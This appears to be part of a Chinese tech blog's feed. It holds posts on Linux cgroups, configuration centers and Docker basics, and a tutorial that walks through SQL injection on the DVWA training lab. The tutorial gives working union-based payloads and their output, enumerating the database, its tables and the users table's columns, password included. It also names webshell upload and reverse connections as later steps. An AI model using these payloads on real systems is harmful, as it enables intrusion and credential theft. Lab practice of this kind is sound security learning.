&#125;</div><div class="line">    pthread_exit(NULL);</div><div class="line">&#125;</div><div class="line">int main (int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">    int num_threads;</div><div class="line">    if (argc &gt; 1)&#123;</div><div class="line">        num_threads = atoi(argv[1]);</div><div class="line">    &#125;</div><div class="line">    if (num_threads&lt;=0 || num_threads&gt;=100)&#123;</div><div class="line">        num_threads = NUM_THREADS;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    /* 设置CPU利用率为50% */</div><div class="line">    mkdir(&quot;/sys/fs/cgroup/cpu/haoel&quot;, 755);</div><div class="line">    system(&quot;echo 50000 &gt; /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us&quot;);</div><div class="line"> </div><div class="line">    mkdir(&quot;/sys/fs/cgroup/cpuset/haoel&quot;, 755);</div><div class="line">    /* 限制CPU只能使用#2核和#3核 */</div><div class="line">    system(&quot;echo \&quot;2,3\&quot; &gt; /sys/fs/cgroup/cpuset/haoel/cpuset.cpus&quot;);</div><div class="line"> </div><div class="line">    pthread_t* threads = (pthread_t*) malloc (sizeof(pthread_t)*num_threads);</div><div class="line">    int rc;</div><div class="line">    long t;</div><div class="line">    for(t=0; t&lt;num_threads; t++)&#123;</div><div class="line">        printf(&quot;In main: creating thread %ld\n&quot;, t);</div><div class="line">        rc = pthread_create(&amp;threads[t], NULL, thread_main, (void *)t);</div><div class="line">        if (rc)&#123;</div><div class="line">            printf(&quot;ERROR; return code from pthread_create() is %d\n&quot;, rc);</div><div class="line">            exit(-1);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    /* Last thing that main() should do */</div><div class="line">    pthread_exit(NULL);</div><div class="line">    free(threads);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li><p>cpu资源报告<br>这个子系统的配置是cpu子系统的补充,提供CPU资源用量的统计,时间单位都是纳秒。<br>cpuacct.usage：统计cgroup中所有task的cpu使用时长。<br>cpuacct.stat：统计cgroup中所有task的用户态和内核态分别使用cpu的时长。<br>cpuacct.usage_percpu：统计cgroup中所有task使用每个cpu的时长</p>
</li>
<li><p>cpu绑定<br>为task分配独立CPU资源的子系统,参数较多,这里只选讲两个必须配置的参数,同时Docker中目前也只用到这两个。<br>cpuset.cpus：在这个文件中填写cgroup可使用的CPU编号,如0-2,16代表 0、1、2和16这4个CPU。<br>cpuset.mems：与CPU类似,表示cgroup可使用的memory node</p>
</li>
<li><p>限制task对device的使用<br>设备黑/白名单过滤<br>devices.allow：允许名单,语法type device_types:node_numbers access type。<br>type有三种类型：b（块设备）、c（字符设备）、a（全部设备）<br>access也有三种方式：r（读）、w（写）、m（创建）<br>devices.deny：禁止名单,语法格式同上。<br>统计报告<br>devices.list：报告为这个cgroup中的task设定访问控制的设备</p>
</li>
<li><p>暂停/恢复cgroup中的task<br>只有一个属性,表示进程的状态,把task放到freezer所在的cgroup,再把state改为FROZEN,就可以暂停进程。不允许在cgroup处于FROZEN状态时加入进程。<br>freezer.state包括如下三种状态： -FROZEN 停止。-FREEZING 正在停止,这个是只读状态,不能写入这个值。-THAWED 恢复</p>
</li>
<li><p>内存资源管理</p>
</li>
</ul>
<p>限额类：<br>memory.limit_bytes：强制限制最大内存使用量,单位有k、m、g三种,填-1则代表无限制。<br>memory.soft_limit_bytes：软限制,只有比强制限制设置的值小时才有意义。当整体内存紧张的情况下,task获取的内存就被限制在软限制额度之内,以保证不会有太多进程因内存挨饿。可以看到,加入了内存的资源限制并不代表没有资源竞争。<br>memory.memsw.limit_bytes：设定最大内存与swap区内存之和的用量限制。<br>报警与自动控制：<br>memory.oom_control：改参数填0或1,0表示开启,当cgroup中的进程使用资源超过界限时立即杀死进程,1表示不启用。默认情况下,包含memory子系统的cgroup都启用。当oom_control不启用时,实际使用内存超过界限时进程会被暂停直到有空闲的内存资源。<br>统计与监控类：<br>memory.usage_bytes：报告该cgroups中进程使用的当前中总内存用量（以字节为单位）。<br>memory.max_usage_bytes：报告该cgroups中进程使用的最大内存使用量。<br>memory.failcnt：报告内存达到在memory.limit_in_bytes设定的限制值次数。<br>memory.stat：包含大量的内存统计数据。<br>cache：页缓存,包括​​tmpfs,单位为字节。<br>rss：匿名和swap,不包括tmpfs,单位为字节。​<br>mapped_file：memory-mapped映射的文件大小,包括tmpfs,单位为字节。<br>pgpgin：存入内存中的页数。<br>pgpgout：从内存中读出页数。<br>swap：swap用量,单位为字节。<br>active_anon：在活跃的最近最少使用（least-recently-used,LRU）列表中的匿名和swap缓存,包括tmpfs,单位为字节。<br>inactive_anon：不活跃的LRU列表中的匿名和swap缓存,包括tmpfs,单位为字节。<br>active_file：活跃LRU列表中的file-backed内存,以字节为单位。<br>inactive_file：不活跃LRU列表中的file-backed内存,以字节为单位。<br>unevictable：无法再生的内存,以字节为单位。<br>hierarchical_memory_limit：包含memory cgroup的层级的内存限制,单位为字节。<br>hierarchical_memsw_limit：包含memory cgroup的层级的内存加swap限制,单位为字节</p>
<p>下面是一个限制内存的示例(代码是个死循环，其它不断的分配内存，每次512个字节，每次休息一秒)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"> </div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int size = 0;</div><div class="line">    int chunk_size = 512;</div><div class="line">    void *p = NULL;</div><div class="line"> </div><div class="line">    while(1) &#123;</div><div class="line"> </div><div class="line">        if ((p = malloc(p, chunk_size)) == NULL) &#123;</div><div class="line">            printf(&quot;out of memory!!\n&quot;);</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">        memset(p, 1, chunk_size);</div><div class="line">        size += chunk_size;</div><div class="line">        printf(&quot;[%d] - memory is allocated [%8d] bytes \n&quot;, getpid(), size);</div><div class="line">        sleep(1);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>之后，我们在另一个终端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># 创建memory cgroup</div><div class="line">$ mkdir /sys/fs/cgroup/memory/haoel</div><div class="line">$ echo 64k &gt; /sys/fs/cgroup/memory/haoel/memory.limit_in_bytes</div><div class="line"> </div><div class="line"># 把上面的进程的pid加入这个cgroup</div><div class="line">$ echo [pid] &gt; /sys/fs/cgroup/memory/haoel/tasks</div></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><b>总结</b></h4><p>内核对cgroups的支持已经较为完善,但是依旧有许多工作需要完善。如网络方面目前是通过TC（Traffic Controller）来控制,未来需要统一整合；资源限制并没有解决资源竞争,在各自限制之内的进程依旧存在资源竞争,优先级调度方面依旧有很大的改进空间</p>
<p>ref</p>
<p><a href="http://70data.net/1131.html" target="_blank" rel="external">Docker学习笔记-Linux cgroups</a><br><a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html-single/Resource_Management_Guide/index.html" target="_blank" rel="external">Reahat Resource Management Guide</a><br><a href="http://coolshell.cn/articles/17049.html" target="_blank" rel="external">Docker基础技术：Linux CGroup</a></p>
<p>t1ger整理于2016.11.25</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;cgroup是什么&quot;&gt;&lt;a href=&quot;#cgroup是什么&quot; class=&quot;headerlink&quot; title=&quot;cgroup是什么&quot;&gt;&lt;/a&gt;&lt;b&gt;cgroup是什么&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;Linux CGroup全称Linux Control Group,L
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置中心那点事</title>
    <link href="https://t1ger.github.io/2016/11/23/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E9%82%A3%E7%82%B9%E4%BA%8B/"/>
    <id>https://t1ger.github.io/2016/11/23/配置中心那点事/</id>
    <published>2016-11-23T05:12:05.000Z</published>
    <updated>2016-11-23T09:46:08.971Z</updated>
    
    <content type="html"><![CDATA[<h4 id="配置中心怎么做"><a href="#配置中心怎么做" class="headerlink" title="配置中心怎么做"></a><b>配置中心怎么做</b></h4><ul>
<li>配置分发，实现有两种方式<br>推：实时性变更，需要应用和配置中心保持长连接，复杂度高<br>拉：实时性相对差，没有增量更新机制会增加配置中心压力，复杂度低</li>
<li>订阅和发布<br>支持配置变更通知，如果是推送，server把每次变更实时发送给订阅客户端<br>如果是拉取，则通过比较client和server的数据md5来实现有效变更通知。server会下发数据和md5给client,client请求的时候会带上md5,假如md5变化，则server重新下发，否则无需变更，返回”无变更”</li>
<li>多环镜、集群配置管理<br>同一份程序在不同的环境（开发，测试，生产）、不同的集群（如不同的数据中心）经常需要有不同的配置，所以需要有完善的环境、集群配置管理</li>
<li>权限控制和操作审计：配置能改变程序的行为,需要有完善的权限控制，以防错误的配置引起的故障。变更操作都要有审计日志，可以方便的追踪问题</li>
<li>版本管理<br>所有的配置发布都有版本概念，从而可以方便的支持配置的回滚</li>
<li>支持灰度发布<br>支持配置的灰度发布，比如点了发布后，只对部分应用实例生效，等观察一段时间没问题后再推给所有应用实例,两种解决方案：<br>a.配置项增加一个host属性，表示这个配置项只“发布”给某些IP<br>b.定义一个优先级，客户端优先加载本地配置文件，这样如果某些机器上的应用需要特殊配置，那么可以采用老的方式上去修改其本地配置文件</li>
<li>支持降级<br>非核心服务降级开关。发生问题时，降级服务的非核心服务</li>
<li>同时支持web页面和Restful API接口</li>
<li>支持多语言，支持php这种无状态语言</li>
<li>支持容错性，当server出现问题时，不影响client的运行</li>
<li>支持本地缓存，减少每次获取配置项时与server的网络消耗，仅server更新时通知client</li>
</ul>
<h4 id="客户端怎么支持"><a href="#客户端怎么支持" class="headerlink" title="客户端怎么支持"></a><b>客户端怎么支持</b></h4><ul>
<li>配合配置中心的推送，在参数变化时调用客户端自行实现的回调接口，不需要重启应用</li>
<li>支持环境变量，JVM启动参数，配置文件，配置中心等多种来源按优先级互相覆盖，并有接口暴露最后的参数选择</li>
<li>配置文件中支持多套profile，如开发，单元测试，集成测试，生产</li>
</ul>
<h4 id="开源解决方案现状"><a href="#开源解决方案现状" class="headerlink" title="开源解决方案现状"></a><b>开源解决方案现状</b></h4><ul>
<li>淘宝的<a href="">Diamond</a></li>
<li>携程开源的<a href="https://github.com/ctripcorp/apollo" target="_blank" rel="external">Applo</a>，支持Java，其他语言通过Http支持</li>
<li>个人开源的<a href="https://github.com/knightliao/disconf/tree/master/disconf-web" target="_blank" rel="external">disconf</a>，只支持Java＋Spring</li>
<li>360的<a href="https://github.com/Qihoo360/QConf" target="_blank" rel="external">Qconf</a>，基于zk，特色是基于Agent模式的多语言支持。但服务端也没有界面、灰度、预案什么的，直接通过API操作ZK而已</li>
<li>个人开源的<a href="https://github.com/hengyunabc/xdiamond" target="_blank" rel="external">xdiamond</a></li>
<li>个人开源的<a href="https://github.com/cncduLee/zk-ucc" target="_blank" rel="external">zk-ucc</a></li>
<li>个人开源的<a href="https://github.com/xuxueli/xxl-conf" target="_blank" rel="external">xxlconf</a></li>
<li>个人开源的<a href="https://github.com/ihaolin/diablo" target="_blank" rel="external">diablo</a></li>
<li><a href="https://github.com/coreos/etcd" target="_blank" rel="external">etcd</a></li>
<li><a href="https://zookeeper.apache.org" target="_blank" rel="external">zookeeper</a></li>
<li><a href="https://www.consul.io/" target="_blank" rel="external">consul</a></li>
<li><a href="https://github.com/kelseyhightower/confd" target="_blank" rel="external">confd</a></li>
<li><a href="http://www.cfg4j.org" target="_blank" rel="external">cfg4j</a></li>
<li><a href="https://github.com/melin/super-diamond" target="_blank" rel="external">super-diamond</a> ,已停止更新</li>
</ul>
<p>开源之外呢？<br>应该说最好的配置中心还是在各个互联网公司的基础架构部里，虽然不是完美，虽然修修补补，常见的两种玩法</p>
<ul>
<li><p>一种玩法是基于zk和etcd，一般支持界面和api,用数据库来保存版本历史，预案，走流程,最后下发到zk或etcd这种有推送能力的存储里（服务注册本身也是用zk或etcd，选型就一块了）。客户端都直接和zk或etcd打交道<br>灰度发布麻烦些，其中一种实现是同时发布一个可接收的IP列表，客户端监听到配置节点变化时，对比一下自己是否属于该列表<br>PHP这种无状态的语言和其他zk/etcd不支持的语言，只好自己在客户端的机器上起一个Agent来监听变化，再写到配置文件或Share Memory了</p>
</li>
<li><p>另一种玩法是基于运维自动化的配置文件的推送，一样有数据库与界面或API来管理配置，下发时生成配置文件，基于各种运维自动化工具如Puppet，Ansible推送到每个客户端。而应用则定时重新读取这个外部的配置文件</p>
</li>
</ul>
<p>ref<br><a href="http://jm.taobao.org/2016/09/28/an-article-about-config-center/" target="_blank" rel="external">一篇好TM长的关于配置中心的文章</a><br><a href="http://calvin1978.blogcn.com/articles/serviceconfig.html" target="_blank" rel="external">服务化体系之－配置中心，在ZK或etcd之外</a><br><a href="http://vernonzheng.com/2015/02/09/%E5%BC%80%E6%BA%90%E5%88%86%E5%B8%83%E5%BC%8F%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E9%80%89%E5%9E%8B/" target="_blank" rel="external">开源分布式配置中心选型</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;配置中心怎么做&quot;&gt;&lt;a href=&quot;#配置中心怎么做&quot; class=&quot;headerlink&quot; title=&quot;配置中心怎么做&quot;&gt;&lt;/a&gt;&lt;b&gt;配置中心怎么做&lt;/b&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;配置分发，实现有两种方式&lt;br&gt;推：实时性变更，需要应用和配置中心保持长连
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker初体验-基础入门指北</title>
    <link href="https://t1ger.github.io/2016/11/21/Docker%E5%88%9D%E4%BD%93%E9%AA%8C-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/"/>
    <id>https://t1ger.github.io/2016/11/21/Docker初体验-基础入门指北/</id>
    <published>2016-11-21T10:08:35.000Z</published>
    <updated>2016-11-22T04:00:20.063Z</updated>
    
    <content type="html"><![CDATA[<h4 id="docker是什么"><a href="#docker是什么" class="headerlink" title="docker是什么"></a><b>docker是什么</b></h4><p>docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口</p>
<h4 id="docker做什么"><a href="#docker做什么" class="headerlink" title="docker做什么"></a><b>docker做什么</b></h4><p>在docker中，你可以将你的程序分为不同的基础部分，对于每一个基础部分都可以当做一个应用程序来管理<br>docker能够帮助你快速地测试、快速地编码、快速地交付，并且缩短你从编码到运行应用的周期<br>docker使用轻量级的容器虚拟化平台，并且结合工作流和工具，来帮助你管理、部署你的应用程序</p>
<h4 id="docker-vs-VM"><a href="#docker-vs-VM" class="headerlink" title="docker vs VM"></a><b>docker vs VM</b></h4><p>VMs = Server + Host OS + Hypervisor（Type2）+ Guest OS + Bins/Libs +(App A | App A’ | App B)<br>Containers = Server + Host OS + Docker Engine + ((Bins/Libs +App A | App A’) | (Bins/Libs +App B))<br>Docker去除了传统虚机的Guest OS层，免除了对应overhead，Docker Engine 替代了VM中的Guest OS + Hypervisor（Type2)层</p>
<h4 id="docker架构"><a href="#docker架构" class="headerlink" title="docker架构"></a><b>docker架构</b></h4><p>docker是CS架构，主要由下面三部分组成：<br>docker daemon: 运行在宿主机上，docker守护进程，用户通过docker client(docker命令)与docker daemon交互<br>docker client: docker 命令行工具，是用户使用docker的主要方式，docker client与docker daemon通信并将结果返回给用户，docker client也可以通过socket或者RESTful api访问远程的docker daemon<br>docker hub/registry: 共享和管理docker镜像，用户可以上传或者下载上面的镜像，官方地址为 <a href="https://registry.hub.docker.com" target="_blank" rel="external">https://registry.hub.docker.com</a> ,也可以搭建自己私有的docker registry</p>
<h4 id="docker技术术语"><a href="#docker技术术语" class="headerlink" title="docker技术术语"></a><b>docker技术术语</b></h4><p>docker的几个技术：namespace,cgroups,veth,bridge,copy-on-write,image,container<br>其中namespace和cgroup是其核心技术,我们主要来介绍这两个</p>
<h4 id="a-namespace"><a href="#a-namespace" class="headerlink" title="a. namespace"></a><b>a. namespace</b></h4><p>负责隔离资源，它让进程拥有独立的进程号，网络，文件系统等，不同的namespace下的进程互不可见，目前的Docker可以通过exec子命令直接切换到进程所在的namespace<br>docker使用到的命名空间有:</p>
<ul>
<li>pid命名空间: 使用在进程隔离(PID: Process ID)</li>
<li>net命名空间: 使用在管理网络接口(NET: Networking)</li>
<li>ipc命名空间: 使用在管理进程间通信资源 (IPC: InterProcess Communication)</li>
<li>mnt命名空间: 使用在管理挂载点 (MNT: Mount)</li>
<li>uts命名空间: 使用在隔离内核和版本标识 (UTS: Unix Timesharing System)</li>
</ul>
<h4 id="b-cgroups"><a href="#b-cgroups" class="headerlink" title="b. cgroups"></a><b>b. cgroups</b></h4><p>cgroup负责限制资源,主要体现在cpu、内存、磁盘</p>
<p><b>CPU子系统</b><br>cgroups提供了三种限制CPU资源的方式：cpuset， cpuquota和cpushares</p>
<ul>
<li><p>cpuset可以限制进程使用的cpu核数，通过cpuset/cpuset.cpus来管理，相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpuset-cpus 0 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
<li><p>cpuquota以时间片的使用率来限制CPU资源，要比cpuset的细粒度大一些，只需要设置一个相对100000的值就可以达到限制一个百分比的效果, 通过 cpu/cpu.cfs_period_us （配置时间片单位，默认为100000）和 cpu/cpu.cfs_quota_us (时间片占比)两个文件来管理,相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpu-quota 50000 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
<li><p>cpushares根据权重来分配CPU资源，比如如果只有一个进程权重为100，那么进程可以使用100%的CPU资源，如果有两个进程且权重都是100，那么每个进程可以使用50%的CPU资源 , 通过 cpu/cpu.shares 来管理，相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpu-shares 1024 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
</ul>
<p><b>内存子系统</b></p>
<ul>
<li>cgroups对内存的限制包括物理内存和swap，当进程使用内存达到上限时会被kill，关于内存限制的文件如下：<br>memory.limit_in_bytes memory.soft_limit_in_bytes memory.memsw.limit_in_byte,需要注意的一点是docker默认会将swap的限制设置为2倍内存，实际使用的内存可能会大于 -m 设置的内存大小,相应的docker命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -m 100m -d --name apache apache</div></pre></td></tr></table></figure>
</li>
</ul>
<p><b>blkio子系统</b></p>
<ul>
<li>blkio子系统的功能是对块设备读写的速率限制,目前 blkio 子系统提供的两种控制策略，一个是权重比例方式的控制，另一个是针对 IO 带宽和 IOPS 的控制.前者是针对blkio.weight 分配权重，后者对blkio.throttle.write_iops_device 进行限制。</li>
</ul>
<p>ref </p>
<p><a href="https://www.baidu.com/link?url=ubhv7epUUNTpytivc7_ikrYX-flsGZHW9gn0REl9273xJa2YpM3kLz2wR6BqkCSMjYMZrXuyJlXQjU1bil4uja&amp;wd=&amp;eqid=e8f57cc000011018000000025833b49b" target="_blank" rel="external">Docker 百度百科</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      how to use docker quickly
    
    </summary>
    
    
      <category term="docker" scheme="https://t1ger.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>dvwa平台测试sql注入</title>
    <link href="https://t1ger.github.io/2016/11/20/dvwa%E5%B9%B3%E5%8F%B0%E6%B5%8B%E8%AF%95sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://t1ger.github.io/2016/11/20/dvwa平台测试sql注入/</id>
    <published>2016-11-20T03:28:59.000Z</published>
    <updated>2016-11-20T05:58:44.255Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。<br>本文所有演示操作都是在此环境中,本文是帮助用户了解信息安全技术、安全漏洞相关信息，不承担任何法律及连带责任</p>
<p>我们的测试环境：<br>测试平台：dvwa<br>渗透工具推荐：burpsuite<br>本次测试主要针对mysql数据库，针对不同的数据库平台，注入语句需要做相应更改</p>
<p>首先，我们此次测试的安全等级为low，先让自己有点信心吗，免的一上来就被打脸</p>
<p>sql注入利用一般有以下几个基本步骤:</p>
<ul>
<li>发现sql注入点</li>
<li>通过mysql数据库帮助，获取账户密码等敏感信息</li>
<li>上传webshell,获得一个反向链接</li>
</ul>
<p>闲言少叙，赶紧开始吧</p>
<p>一般我们先登入dvwa平台，选择Sql Injection选项，有的同学要说了，用户密码是什么呀？这个。。。，其实找个暴力破解工具解决了，如果不行问问谷歌也可以哈<br>这里我们看到一个输入框，提示我们输入用户id,这里我们输入数字1，提交后返回了用户1的信息<br>它一共返回三行数据<br>一行是我们输入的用户ID。一行是用户名，另外一行是用户别名。同时，看一下浏览器的地址栏那里，发现url成这样了<br><a href="http://192.168.100.100/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="external">http://192.168.100.100/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a></p>
<p>接下来我们输入2,发现url变成了<br><a href="http://192.168.100.100/vulnerabilities/sqli/?id=2&amp;Submit=Submit#" target="_blank" rel="external">http://192.168.100.100/vulnerabilities/sqli/?id=2&amp;Submit=Submit#</a></p>
<p>接下来我们输入“’”时，页面提示错误“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’’ at line 1”，结果如图。看到这个结果，我们可以欣慰的知道，这个表单存在着注入漏洞。<br>之所以产生错误是因为，输入的用户ID中,单引号不是一个整数类型的，导致后端SQL查询产生了错误，可以想象一下后端SQL查询语句大概是这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;select first_name,last_name from users where user_id=”;</div></pre></td></tr></table></figure>
<p>在我们输入“’”后，sql语句就会变成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MySQL&gt; select first_name, last_name from users where user_id=”’ ;</div></pre></td></tr></table></figure></p>
<p>好了，到这里，我们可以得出这里传进去的id的值是我们可以控制的。前端的该语句是会在后端的sql服务器进行执行的，这将使sql注入变为可能</p>
<p>在我们确认了漏洞之后，就可以构造payload了。什么是payload?说白了就是一段恶意代码，以便我们能够获得数据库里面的数据。<br>我们需要确定表里边有几个字段，常用的方法有两种</p>
<ul>
<li>用order by 语句</li>
<li>用union select </li>
</ul>
<p>分析字段数的原因是我们之后需要用union select 语句获得我们需要的敏感数据。<br>由order by 语法知道，要是后面跟着的数字超出了字段数时，就会报错<br>我们构造的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1&apos; order by 1#</div><div class="line">1&apos; order by 2#</div><div class="line">1&apos; order by 3#</div></pre></td></tr></table></figure></p>
<p>当输入到3的时候，发现它报错了，也就是说字段数为2。</p>
<p>当用union select 猜测的时候也是一样，当字段数不对应的时候，它也是会发生报错的，这里直接贴出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1&apos; union select 1#</div><div class="line">1&apos; union select 1,2#</div><div class="line">1&apos; union select 1,2,3#</div></pre></td></tr></table></figure></p>
<p>准备工作都做好了，那我们开始获取数据库的敏感信息了：获取当前数据库名和用户名，构造payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&apos; union select database(),user()#</div></pre></td></tr></table></figure></p>
<p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: 1&apos; union select database(),user()#</div><div class="line">First name: admin</div><div class="line">Surname: admin</div><div class="line">ID: 1&apos; union select database(),user()#</div><div class="line">First name: dvwa</div><div class="line">Surname: admin@localhost</div></pre></td></tr></table></figure></p>
<p>我们可以看到当前使用的数据库为：dvwa，当前的用户名：root@localhost。<br>类似的函数还有：version() 获取当前数据库版本,@@version_compile_os获取当前操作系统。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select version(),@@version_compile_os#</div></pre></td></tr></table></figure></p>
<p>光获得这些信息有什么用呢，慢慢听我道来<br>我们知道mysql有个information_schema，这是一个包含了mysql数据库所有信息的“字典”，本质上还是一个database，存放着其他各个数据的信息<br>在information_schema里，有一个表tables。有一个columns……是不是有点感觉了？ tables这个表存放的是关于数据库中所有表的信息，里面有个字段叫table_name，还有个字段叫做table_schema。其中table_name是表名，table_schema表示的是这个表所在的数据库。对于columns，它有column_name，table_schema，table_name。回想一下，我们拥有的信息是数据库名。也就是说我们可以构造这样的payload来从数据库里获取一些东西。</p>
<p>构造的查询语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div></pre></td></tr></table></figure></p>
<p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: guestbook</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: users</div><div class="line">Surname: 2</div></pre></td></tr></table></figure></p>
<p>出来两个表，对那个感兴趣呢？？？当然是users表啦！不是说还有一个columns表么？所以我们还需要table_name以及table_schema来查column_name。这次我们构造的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div></pre></td></tr></table></figure></p>
<p>返回如下信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user_id</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: first_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: last_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: password</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: avatar</div><div class="line">Surname: 2</div></pre></td></tr></table></figure>
